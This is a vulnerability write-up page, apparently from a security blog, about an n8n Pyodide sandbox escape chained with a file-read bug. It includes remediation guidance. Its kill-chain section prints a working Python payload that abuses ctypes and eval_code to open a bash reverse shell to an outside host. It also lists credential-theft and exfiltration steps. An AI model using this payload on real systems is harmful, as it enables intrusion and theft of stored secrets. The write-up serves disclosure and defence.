@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      N8scape &middot; tralsesec
+    
+  </title>
+
+  <!-- CSS -->
+  <!--<link rel="stylesheet" href="public/css/poole.css">-->
+  <!--<link rel="stylesheet" href="public/css/blackdoc.css">-->
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/modern.css">
+  <!--<link rel="stylesheet" href="public/css/operator.css">-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=EB+Garamond">
+  <!-- Icons -->
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/apple-touch-icon.png">
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+</head>
+
+
+  <body>
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          tralsesec
+        </a>
+      </h1>
+      <p class="lead">Offensive Security Researcher · Malware Developer & Analyst · Exploit Developer · CTF Player</p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+      <a class="sidebar-nav-item" href="/about">About</a>
+      <a class="sidebar-nav-item" href="/projects">Projects</a>
+      <a class="sidebar-nav-item active" href="/anatomy-of-a-bug">Anatomy of a Bug</a>
+      <a class="sidebar-nav-item" href="/ctfs">Capture the Flags</a>
+
+      <hr style="border: 0; border-top: 1px solid var(--border); margin: 1.5rem 0;">
+
+      <a class="sidebar-nav-item" href="https://x.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        X
+      </a>
+
+      <a class="sidebar-nav-item" href="https://github.com/tralsesec" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+        GitHub
+      </a>
+
+      <a class="sidebar-nav-item" href="https://app.hackthebox.com/public/users/475600" target="_blank" rel="noopener noreferrer">
+        <svg style="width:16px; height:16px; margin-right:8px; vertical-align:middle; fill:currentColor;" viewBox="0 0 24 24"><path d="M11.99 0l-10.4 6.02v12.01l10.4 6.02 10.4-6.02V6.02L11.99 0zM3.46 17.2V6.9l8.53-4.93 8.53 4.93v10.3l-8.53 4.93-8.53-4.93z"/><path d="M11.99 3.5L4.8 7.66v8.32l7.19 4.16 7.19-4.16V7.66L11.99 3.5zm5.72 11.53l-5.72 3.31-5.72-3.31V8.47l5.72-3.31 5.72 3.31v6.56z"/></svg>
+        HackTheBox
+      </a>
+
+    </nav>
+
+    <p style="margin-top: auto; padding-top: 2rem; margin-bottom: 0; font-size: 0.9rem;">
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <div class="content container">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="article" />
+<meta property="og:site_name" content="#! Anatomy of a Bug" />
+<meta property="og:title" content="N8scape (#10)" />
+<meta property="og:description" content="Authenticated users can abuse Python's FFI to escape the Pyodide sandbox, granting full RCE over the automation host." />
+<meta property="og:url" content="https://tralsesec.github.io/anatomy-of-a-bug/md/10/" />
+
+<meta name="theme-color" content="#6c189d">
+
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="N8scape (#10)">
+<meta property="twitter:description" content="Authenticated users can abuse Python's FFI to escape the Pyodide sandbox, granting full RCE over the automation host.">
+<meta name="twitter:site" content="#! Anatomy of a Bug">
+
+<meta property="og:image" content="https://tralsesec.github.io/anatomy-of-a-bug/assets/og/10.png" />
+<meta property="twitter:image" content="https://tralsesec.github.io/anatomy-of-a-bug/assets/og/10.png" />
+
+<div class="page">
+
+  <header class="intel-header-panel" style="border-bottom: 1px solid #444; padding-bottom: 1.5rem; margin-bottom: 2rem;">
+
+    <div style="display: flex; flex-wrap: wrap; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 1.5rem;">
+      
+      <h1 class="page-title" style="margin: 0; line-height: 1.1; padding-bottom: 0rem;">
+        
+        N8scape
+      </h1>
+      
+      
+    </div>
+
+    
+    <div class="intel-meta-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; font-family: monospace; font-size: 0.85em; color: #aaa; margin-bottom: 1rem;">
+      
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">STATUS</div>
+        <div style="color: #fff; letter-spacing: 0.5px;">DECLASSIFIED</div>
+      </div>
+
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">SEVERITY</div>
+        <div class="text-red" style="font-weight: bold;">9.9</div>
+      </div>
+
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">DISCOVERED</div>
+        <div>2025-12-26</div>
+      </div>
+
+      <div class="meta-block">
+        <div style="font-size: 0.75em; opacity: 0.6; margin-bottom: 2px;">UPLOADED</div>
+        <div>2026-01-14</div>
+      </div>
+
+    </div>
+    
+
+    
+    <div class="intel-tags" style="display: flex; flex-wrap: wrap; gap: 8px; font-family: monospace; font-size: 0.75em;">
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#PYTHON</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#WEBASSEMBLY</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#SANDBOX ESCAPE</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#RCE</span>
+      
+        <span style="background: rgba(255,255,255,0.05); border: 1px solid #444; padding: 2px 8px; border-radius: 2px; color: #888;">#WEB</span>
+      
+    </div>
+    
+
+  </header>
+
+  
+
+  
+  <div id="intel-toc" style="display: none; margin-bottom: 3rem; margin-top: 1rem;">
+    
+    <div style="
+        border-bottom: 1px dashed #444; 
+        padding-bottom: 0.5rem; 
+        margin-bottom: 1rem; 
+        font-family: monospace; 
+        font-size: 0.85em; 
+        color: #666;
+    ">
+      <span style="opacity: 0.5; margin-right: 10px;">// TABLE OF CONTENTS</span>
+      <!--<strong>LOG_ENTRY_NAVIGATION</strong>-->
+    </div>
+
+    <ul id="toc-list" style="
+        list-style: none; 
+        padding: 0; 
+        margin: 0; 
+        font-family: monospace; 
+        font-size: 0.9rem;
+    ">
+      </ul>
+  
+
+  </div>
+
+  <div class="intel-content">
+    <h2 id="1-the-patient">1. The Patient</h2>
+
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">n8n</code> (Workflow Automation Tool)</p>
+
+<p><strong>Component:</strong> Python Code Node (Pyodide Execution Environment)</p>
+
+<p><strong>Vector:</strong> Authenticated Remote Code Execution (Post-Auth), escalatable to Unauthenticated via Chaining.</p>
+
+<p>n8n functions as the “Central Nervous System” of modern enterprise stacks. It acts as an <strong>Automation Control Plane</strong>, designed to ingest data from one source (e.g., a PostgreSQL database), process it, and route it to another (e.g., Salesforce, Slack, or AWS Lambda).</p>
+
+<p>To facilitate complex data manipulation, n8n introduced “Code Nodes,” allowing users to write custom JavaScript or Python scripts within their workflows. In self-hosted environments, this presents the classic “Untrusted Code Execution” problem. The platform must execute user-defined logic while preventing that logic from accessing the host operating system.</p>
+
+<blockquote>
+  <p><strong>The Hub-and-Spoke Risk Model</strong>
+The compromise of an n8n instance is mathematically distinct from a standard web server breach. Because n8n requires stored credentials to function, a compromise of the “Hub” (n8n) grants immediate, authenticated access to every “Spoke” (connected API/Service).</p>
+
+  <p>In this incident, the “N8scape” vulnerability (CVE-2025-68668) shattered the boundary between the user’s script and the server’s kernel.</p>
+</blockquote>
+
+<h2 id="2-the-diagnosis">2. The Diagnosis</h2>
+
+<p><strong>Root Cause:</strong> Reliance on Blocklisting for Dynamic Language Isolation (CWE-693) and Unrestricted FFI Access.</p>
+
+<p>The vulnerability stems from the architectural decision to run Python code using <strong>Pyodide</strong>—a port of CPython to WebAssembly (Wasm)—directly inside the main Node.js process. While Wasm offers a memory-safe sandbox by default, n8n needed to bridge data between Node.js and Python to make the tool useful. To secure this, they relied on a <strong>Blocklist (Denylist)</strong> strategy, attempting to forbid specific Python modules (like <code class="language-plaintext highlighter-rouge">os</code>, <code class="language-plaintext highlighter-rouge">subprocess</code>) and JavaScript bridges.</p>
+
+<h3 id="bug-a-the-blocklist-fallacy">Bug A: The Blocklist Fallacy</h3>
+
+<p>Python is a highly introspective language. Relying on a static list of “bad words” to prevent malicious behavior is structurally flawed. The “N8scape” exploit bypassed the initial static analysis/filter by utilizing an internal API function: <code class="language-plaintext highlighter-rouge">_pyodide._base.eval_code()</code>.</p>
+
+<p>By passing the malicious payload as a string to this internal evaluator, the code bypasses the surface-level token scanners that look for forbidden imports.</p>
+
+<h3 id="bug-b-the-ctypes-bridge">Bug B: The ctypes Bridge</h3>
+
+<p>The fatal flaw was leaving the <code class="language-plaintext highlighter-rouge">ctypes</code> library accessible within the Pyodide environment. <code class="language-plaintext highlighter-rouge">ctypes</code> is Python’s Foreign Function Interface (FFI) library. It allows Python code to call functions in shared libraries (DLLs/.so) and manipulate C-data types in memory.</p>
+
+<p>In a standard Wasm environment, loading external libraries is restricted. However, because Pyodide was running inside a Node.js host with specific Emscripten configurations, <code class="language-plaintext highlighter-rouge">ctypes</code> could still access the memory space of the running process.</p>
+
+<p><strong>The Mechanics of the Escape:</strong></p>
+
+<ol>
+  <li><strong>Memory Access:</strong> The attacker uses <code class="language-plaintext highlighter-rouge">ctypes.CDLL(None)</code>. In POSIX systems (and their emulations), passing <code class="language-plaintext highlighter-rouge">None</code> returns a handle to the main executable and its global symbol table.</li>
+  <li><strong>Symbol Resolution:</strong> The attacker resolves the address of the C standard library function <code class="language-plaintext highlighter-rouge">system()</code>.</li>
+  <li><strong>Execution:</strong> The attacker calls this function directly from memory, bypassing the Python <code class="language-plaintext highlighter-rouge">os.system</code> wrapper entirely.</li>
+</ol>
+
+<p>The blocklist prevented the <em>high-level</em> Python call (<code class="language-plaintext highlighter-rouge">os.system</code>), but failed to prevent the <em>low-level</em> memory call (<code class="language-plaintext highlighter-rouge">libc.system</code>) that <code class="language-plaintext highlighter-rouge">os.system</code> wraps.</p>
+
+<h2 id="3-the-kill-chain">3. The Kill-Chain</h2>
+
+<p>While CVE-2025-68668 requires authentication, the true devastation of this incident was its deployment in a chain alongside CVE-2026-21858.</p>
+
+<h3 id="phase-1-the-confusion-unauthenticated-recon">Phase 1: The Confusion (Unauthenticated Recon)</h3>
+
+<p><strong>Vuln:</strong> CVE-2026-21858 (Arbitrary File Read)</p>
+
+<p>The attacker targets an n8n Webhook endpoint. Due to a logic flaw in the <code class="language-plaintext highlighter-rouge">multipart/form-data</code> parser, a crafted request confuses the server into treating a JSON body as a file upload configuration. This allows the attacker to overwrite the internal file-handling config and force the server to “read” a sensitive local file (like <code class="language-plaintext highlighter-rouge">/home/node/.n8n/config</code> or the SQLite database) and return it in the webhook response.</p>
+
+<h3 id="phase-2-the-escalation-credential-theft">Phase 2: The Escalation (Credential Theft)</h3>
+
+<p>From the stolen database or config file, the attacker extracts the administrator password hash or session tokens. They use this to log into the n8n dashboard with full administrative privileges.</p>
+
+<h3 id="phase-3-the-injection-n8scape-deployment">Phase 3: The Injection (N8scape Deployment)</h3>
+
+<p><strong>Vuln:</strong> CVE-2025-68668 (Sandbox Escape)</p>
+
+<p>The attacker creates a new workflow and adds a Python Code Node. They inject the payload designed to bypass the Pyodide restrictions:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">_pyodide._base</span>
+
+<span class="c1"># The payload is wrapped in a string to evade static analysis
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sh">"""</span><span class="s">
+import ctypes
+# 1. Load the main process symbol table
+#    This bypasses the need to import </span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s"> or </span><span class="sh">'</span><span class="s">subprocess</span><span class="sh">'</span><span class="s">
+libc = ctypes.CDLL(None)
+
+# 2. Execute a reverse shell via the C library</span><span class="sh">'</span><span class="s">s system() function
+#    The sandbox watches Python, but it cannot watch raw memory calls.
+libc.system(b</span><span class="sh">"</span><span class="s">bash -c </span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1</span><span class="sh">'"</span><span class="s">)
+</span><span class="sh">"""</span>
+
+<span class="c1"># 3. Tunnel the payload through the internal evaluator
+</span><span class="n">_pyodide</span><span class="p">.</span><span class="n">_base</span><span class="p">.</span><span class="nf">eval_code</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<h3 id="phase-4-the-total-compromise">Phase 4: The Total Compromise</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">libc.system</code> call executes with the privileges of the n8n process. The attacker gains a reverse shell. From here, they can:</p>
+
+<ul>
+  <li>Dump <code class="language-plaintext highlighter-rouge">env</code> to steal AWS keys, Stripe secrets, and Database credentials.</li>
+  <li>Pivot to internal networks (SSRF/Tunneling) using n8n as a jump box.</li>
+  <li>Modify legitimate workflows to silently exfiltrate future business data.</li>
+</ul>
+
+<h2 id="4-the-fix">4. The Fix.</h2>
+
+<p>The remediation represents a fundamental shift in architecture, moving from <strong>Thread Isolation</strong> (fragile) to <strong>Process Isolation</strong> (robust).</p>
+
+<p><strong>The Legacy Architecture (Vulnerable):</strong></p>
+
+<ul>
+  <li><strong>Mechanism:</strong> Pyodide (Wasm) inside the Main Process.</li>
+  <li><strong>Security:</strong> Blocklists/Monkey-patching.</li>
+  <li><strong>Failure:</strong> Shared memory space and FFI allowed escape.</li>
+</ul>
+
+<p><strong>The v2.0.0 Architecture (Secure):</strong></p>
+
+<ul>
+  <li><strong>Mechanism:</strong> Task Runners.</li>
+  <li><strong>Security:</strong> Native Python processes isolated via IPC.</li>
+  <li><strong>Success:</strong> The user code runs in a completely separate process (or container). Even if they escape the Python sandbox, they are trapped in an ephemeral, low-privilege “Runner” process that has no access to the main application’s memory or secrets.</li>
+</ul>
+
+<p><strong>Immediate Remediation Code:</strong></p>
+
+<p>For users unable to upgrade to v2.0.0 immediately, n8n introduced environment flags to force the use of external runners in v1.x versions:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Force the use of external task runners (Process Isolation)</span>
+<span class="nb">export </span><span class="nv">N8N_RUNNERS_ENABLED</span><span class="o">=</span><span class="nb">true
+export </span><span class="nv">N8N_NATIVE_PYTHON_RUNNER</span><span class="o">=</span><span class="nb">true</span>
+
+<span class="c"># OR: Disable Python entirely if runners cannot be deployed</span>
+<span class="nb">export </span><span class="nv">N8N_PYTHON_ENABLED</span><span class="o">=</span><span class="nb">false</span>
+
+</code></pre></div></div>
+
+<h2 id="5-developers-takeaway">5. Developer’s Takeaway</h2>
+
+<p><strong>The Death of the Blocklist.</strong></p>
+
+<p>This vulnerability serves as a definitive tombstone for blocklist-based sandboxing in dynamic languages. If a language allows Introspection (inspecting itself) or FFI (calling C code), it is mathematically impossible to secure it by forbidding specific function names.</p>
+
+<p><strong>The “Trusted” Infrastructure Fallacy.</strong></p>
+
+<p>Organizations often treat automation tools as “Internal Trusted Apps.” N8scape demonstrates that these tools are actually <strong>Hostile Multi-Tenant Environments</strong>. Even if the tenants are your own employees, the execution environment must be hardened as if it were a public cloud provider. Code execution nodes should never share process memory with the application holding the keys to the kingdom.</p>
+
+<p><strong>Strategic Pivot:</strong>
+Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their stack. If the platform executes code, ask: <em>Does this run in a Thread or a Container?</em> If the answer is Thread, assume it is already compromised.</p>
+
+  </div>
+
+  
+  <div class="intel-credits" style="margin-top: 4rem; padding-top: 1rem; border-top: 1px dashed #444; font-family: monospace; text-align: right; color: #666; font-size: 0.85em;">
+    <span style="margin-right: 10px; opacity: 0.5;">// END TRANSMISSION</span>
+    <strong>CREDIT: Cyera Research Labs</strong>
+  </div>
+   
+
+</div>
+
+
+
+
+
+
+
+
+
+  
+
+  <style>
+    .tooltip { position: relative; display: inline-block; cursor: help; }
+    .tooltip .tooltiptext {
+      visibility: hidden; width: 200px; background-color: #1a1a1a; color: #fff;
+      text-align: left; border: 1px solid var(--accent); padding: 8px; position: absolute;
+      z-index: 10; bottom: 125%; left: 50%; margin-left: -100px; opacity: 0;
+      transition: opacity 0.3s; font-family: var(--font-mono); font-size: 0.65rem; line-height: 1.4;
+      pointer-events: none;
+    }
+    .tooltip:hover .tooltiptext { visibility: visible; opacity: 1; }
+  </style>
+
+  <div class="related-aoabs" style="margin-top: 0rem; border-top: 0px solid var(--border); padding-top: 0rem;">
+    <h3 style="color: var(--accent); margin-bottom: 1.5rem; font-family: var(--font-mono);">// RELATED_INTELLIGENCE</h3>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem;">
+      
+      
+        
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0; border: 1px solid #333; overflow: hidden;">
+            <img src="/anatomy-of-a-bug/assets/og/6.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.9;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">CVE-REPORT</span>
+              <span style="color: #888; font-weight: bold;">
+                10.0
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0; line-height: 1.2;">
+                <a href="/anatomy-of-a-bug/md/6/" style="border: none; font-size: 0.9rem; color: #eee;">AsyncOS Quarantine Collapse</a>
+            </h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 60%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                60% LINKED
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • Python<br>• RCE<br>• Web
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0; border: 1px solid #333; overflow: hidden;">
+            <img src="/anatomy-of-a-bug/assets/og/5.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.9;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">CVE-REPORT</span>
+              <span style="color: #888; font-weight: bold;">
+                9.8
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0; line-height: 1.2;">
+                <a href="/anatomy-of-a-bug/md/5/" style="border: none; font-size: 0.9rem; color: #eee;">FortiWeb Edge Collapse</a>
+            </h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 40%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                40% LINKED
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • RCE<br>• Web
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+        
+        
+        
+        
+        
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+
+        <div class="related-card" style="border: 1px solid #222; background: #0a0a0a; display: flex; align-items: center; padding: 0.8rem; gap: 1rem; position: relative;">
+          
+          <div style="width: 60px; height: 60px; flex-shrink: 0; border: 1px solid #333; overflow: hidden;">
+            <img src="/anatomy-of-a-bug/assets/og/4.png" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.9;">
+          </div>
+
+          <div style="flex-grow: 1;">
+            <div style="display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.6rem;">
+              <span class="fg-dim">CVE-REPORT</span>
+              <span style="color: #888; font-weight: bold;">
+                10.0
+              </span>
+            </div>
+            
+            <h4 style="margin: 3px 0; line-height: 1.2;">
+                <a href="/anatomy-of-a-bug/md/4/" style="border: none; font-size: 0.9rem; color: #eee;">iOS26 "Liquid Glass" Exploitation Chain</a>
+            </h4>
+            
+            <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+              <div style="width: 80px; height: 4px; background: #222; border-radius: 2px;">
+                <div style="width: 40%; height: 100%; background: var(--accent);"></div>
+              </div>
+              <span style="font-family: var(--font-mono); font-size: 0.6rem; color: var(--accent);">
+                40% LINKED
+              </span>
+              
+              <div class="tooltip">
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5; vertical-align: middle;"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                <span class="tooltiptext">
+                  <strong style="color: var(--accent); display: block; margin-bottom: 5px;">SHARED_VECTORS:</strong>
+                  • RCE<br>• Web
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  </div>
+
+
+
+<style>
+/* --- TABLE OF CONTENTS (Stealth Mode) --- */
+#intel-toc {
+  display: none;
+  margin-bottom: 4rem;
+  margin-top: 1rem;
+  /* NO BOX, NO BORDER, NO BACKGROUND */
+  border: none;
+  background: transparent;
+  padding: 0;
+  position: relative;
+}
+
+/* The Label: Looks like a code comment */
+#intel-toc .toc-label {
+  font-family: var(--font-mono);
+  font-size: 0.65rem;
+  color: #444; /* Very dark/subtle */
+  margin-bottom: 1rem;
+  margin-left: 1px; /* Align with the timeline line */
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  user-select: none;
+}
+
+/* The List Container */
+#toc-list {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  /* The "Timeline" Line */
+  border-left: 1px solid #222; 
+  padding-left: 0;
+}
+
+#toc-list li {
+  margin-bottom: 0;
+  position: relative;
+}
+
+/* --- H2 (Main Levels) --- */
+.toc-h2 {
+  padding-top: 8px;
+  padding-bottom: 8px;
+}
+
+.toc-h2 a {
+  display: flex;
+  align-items: center;
+  padding-left: 1.5rem;
+  color: var(--fg-primary);
+  border-bottom: none;
+  transition: transform 0.2s ease;
+}
+
+/* The Hover Effect: Slide Right + Green Highlight */
+.toc-h2 a:hover {
+  color: var(--accent);
+  transform: translateX(5px);
+  border-bottom: none;
+}
+
+/* Add a tiny horizontal tick mark on the left line for H2s */
+.toc-h2::before {
+  content: '';
+  position: absolute;
+  left: 0;
+  top: 50%;
+  width: 10px; /* Length of the tick */
+  height: 1px;
+  background-color: #222;
+}
+
+/* --- H3 (Sub Levels) --- */
+.toc-h3 {
+  padding-top: 4px;
+  padding-bottom: 4px;
+}
+
+.toc-h3 a {
+  padding-left: 3.5rem; /* Deep Indent */
+  font-size: 0.75rem;   /* Smaller Text */
+  color: var(--fg-dim); /* Dimmer Color */
+  border-bottom: none;
+  display: block;
+}
+
+.toc-h3 a:hover {
+  color: #fff;
+}
+
+/* The Numbers / Symbols */
+.toc-num {
+  color: var(--accent); /* Hacker Green */
+  font-weight: bold;
+  margin-right: 12px;
+  font-size: 0.9em;
+  min-width: 20px; /* Align text even if numbers grow */
+  display: inline-block;
+}
+
+/* --- SECTION ANCHORS (The # symbol) --- */
+.anchor-link {
+  opacity: 0;                /* Hidden by default */
+  margin-left: 0.8rem;       /* Add space between Text and # */
+  color: var(--fg-dim);      /* Dim color */
+  text-decoration: none;     /* No underline */
+  border-bottom: none !important; /* Force remove theme underline */
+  font-size: 0.8em;
+  transition: opacity 0.2s ease, transform 0.2s ease;
+  cursor: pointer;
+  
+  /* Ensure it doesn't mess up layout */
+  display: inline-block;
+  vertical-align: middle;
+}
+
+/* REVEAL ON HOVER */
+/* When you hover over the H2 or H3, show the anchor */
+h2:hover .anchor-link,
+h3:hover .anchor-link {
+  opacity: 1;
+  transform: translateX(3px); /* Subtle slide in */
+}
+
+/* Hovering over the # itself makes it bright */
+.anchor-link:hover {
+  color: var(--accent) !important;
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const tocContainer = document.getElementById('intel-toc');
+  const tocList = document.getElementById('toc-list');
+  const headers = document.querySelectorAll('.intel-content h2, .intel-content h3');
+
+  if (headers.length > 0) {
+    tocContainer.style.display = 'block';
+
+    let h2Count = 0;
+
+    headers.forEach((header, index) => {
+      // 1. Generate ID if missing
+      if (!header.id) {
+        const slug = header.textContent
+          .toLowerCase()
+          .trim()
+          .replace(/[^\w\s-]/g, '')
+          .replace(/[\s_-]+/g, '-');
+        header.id = slug || `section-${index}`;
+      }
+
+      // 2. Add Anchor Link (#)
+      const anchor = document.createElement('a');
+      anchor.href = `#${header.id}`;
+      anchor.className = 'anchor-link';
+      anchor.textContent = '#';
+      header.appendChild(anchor);
+
+      // 3. Prepare TOC Data
+      const li = document.createElement('li');
+      const link = document.createElement('a');
+      link.href = `#${header.id}`;
+
+      // --- THE FIX: INTELLIGENT NUMBER PARSING ---
+      
+      let rawText = header.childNodes[0].textContent.trim();
+      let displayNum = "";
+      let displayText = rawText;
+
+      // Check if the text ALREADY starts with a number (e.g., "1. The Patient")
+      // Regex looks for: Start of line -> digits -> dot -> optional digits -> dot -> space
+      const existingNumMatch = rawText.match(/^(\d+(?:\.\d+)*)\.?\s+(.*)/);
+
+      if (header.tagName === 'H2') {
+        li.className = 'toc-h2';
+        h2Count++;
+
+        if (existingNumMatch) {
+            // Case A: User wrote "1. The Patient"
+            // We use "01" (padded version of their "1") and strip the number from the text
+            let foundNum = existingNumMatch[1]; // "1"
+            displayNum = foundNum.padStart(2, '0'); // "01"
+            displayText = existingNumMatch[2]; // "The Patient"
+        } else {
+            // Case B: User wrote "The Patient" (No number)
+            // We generate our own number
+            displayNum = h2Count.toString().padStart(2, '0');
+            displayText = rawText;
+        }
+
+      } else if (header.tagName === 'H3') {
+        li.className = 'toc-h3';
+        
+        if (existingNumMatch) {
+            // User wrote "1.1 Subpoint"
+            displayNum = existingNumMatch[1]; // "1.1"
+            displayText = existingNumMatch[2]; // "Subpoint"
+        } else {
+            // User wrote "Subpoint"
+            displayNum = "└"; 
+            displayText = rawText;
+        }
+      }
+
+      // 4. Construct HTML
+      link.innerHTML = `<span class="toc-num">${displayNum}</span> ${displayText}`;
+      
+      li.appendChild(link);
+      tocList.appendChild(li);
+    });
+  }
+});
+</script>
+
+    </div>
+
